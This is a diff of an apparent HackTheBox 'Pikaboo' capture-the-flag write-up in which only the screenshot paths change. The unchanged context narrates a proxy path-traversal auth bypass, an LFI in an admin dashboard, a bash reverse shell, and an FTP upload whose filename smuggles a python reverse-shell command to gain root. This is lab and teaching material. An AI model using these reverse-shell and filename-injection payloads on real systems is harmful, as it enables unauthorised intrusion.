@@ -23,23 +23,23 @@ Anonymous logins does not work for this site. We can take a look at the HTTP sit
 
 It's a Pokemon based website:
 
-![](<../../../.gitbook/assets/image%20(1968).png>)
+![](../../../.gitbook/assets/pikaboo-3.png)
 
 The admin portal requires credentials to access:
 
-![](<../../../.gitbook/assets/image%20(1055).png>)
+![](../../../.gitbook/assets/pikaboo-1.png)
 
 We can take a look at the Pokatdex and see that there are entries for each specific creature. Props to the creator for designing these:
 
-![](<../../../.gitbook/assets/image%20(2462).png>)
+![](../../../.gitbook/assets/pikaboo-5.png)
 
 When we try to view the entries, we just see this:
 
-![](<../../../.gitbook/assets/image%20(3991).png>)
+![](../../../.gitbook/assets/pikaboo-8.png)
 
 The URL visited `http://10.129.95.191/pokeapi.php?id=6`, which might be relevant later on. I tested LFI and other types of injection, but nothing worked. I took a closer look at the administrator login, and found that if I keyed in wrong credentails, I got a unique error.
 
-![](<../../../.gitbook/assets/image%20(2718).png>)
+![](../../../.gitbook/assets/pikaboo-6.png)
 
 For some reason, it was redirecting me to port 81 on the localhost. This means that some type of proxy is being used to forward the traffic to the right destination. It's called a reverse proxy, and looking for exploits for it led me to this:
 
@@ -47,7 +47,7 @@ For some reason, it was redirecting me to port 81 on the localhost. This means t
 
 Based on the PoC, this is a misconfiguration regarding the proxy used for the `/admin` directory. We can test it out and find that we have bypassed authentication using this method and get a 403 instead.
 
-![](<../../../.gitbook/assets/image%20(3214).png>)
+![](../../../.gitbook/assets/pikaboo-7.png)
 
 I tried a `gobuster` scan on this new URL to see if we can find new files to access, and it seems `server-status` has been left publicly available.
 
@@ -89,7 +89,7 @@ There are loads of requests, and it seems that there's an extra directory at `ad
 
 This was a dashboard of some sort.
 
-![](<../../../.gitbook/assets/image%20(721).png>)
+![](../../../.gitbook/assets/pikaboo-9.png)
 
 The URL is `http://10.129.95.191/admin../admin_staging/index.php?page=dashboard.php`. This could be vulnerable to LFI. I used `wfuzz` to see what files existed on the page using the LFI wordlist. Ideally, we are looking for some type of configuration files.
 
@@ -165,7 +165,7 @@ Great, we now have RCE. We just need to include a `bash` reverse shell one-liner
 
 After viewing the page again, we would get a shell as `www-data`.
 
-![](<../../../.gitbook/assets/image%20(1413).png>)
+![](../../../.gitbook/assets/pikaboo-2.png)
 
 We can grab the user flag.
 
@@ -405,6 +405,6 @@ ftp> put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\
 
 Remember to have a backslash behind all spaces and spaces to allow the upload to work. After waiting for a little while, we would get a reverse shell on the specified port.
 
-![](<../../../.gitbook/assets/image%20(2355).png>)
+![](../../../.gitbook/assets/pikaboo-4.png)
 
 Rooted!
